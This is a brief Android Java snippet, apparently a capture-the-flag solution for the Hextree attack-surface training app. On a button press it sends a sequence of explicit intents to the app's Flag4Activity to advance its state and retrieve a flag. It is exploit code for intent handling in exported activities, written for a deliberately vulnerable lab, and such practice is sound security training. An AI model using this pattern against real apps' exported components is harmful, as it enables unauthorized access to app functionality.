        Button button;
        
        button = findViewById(R.id.Btn);

        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String[] actions = {
                        "GET_FLAG_ACTION",
                        "BUILD_ACTION",
                        "PREPARE_ACTION"
                };

                for (String action : actions) {
                    Intent intent = new Intent();
                    intent.setAction(action);
                    intent.setClassName(
                            "io.hextree.attacksurface",
                            "io.hextree.attacksurface.activities.Flag4Activity"
                    );
                    // note: require 4 clicks on button 
                    startActivity(intent);
                }

            }
        }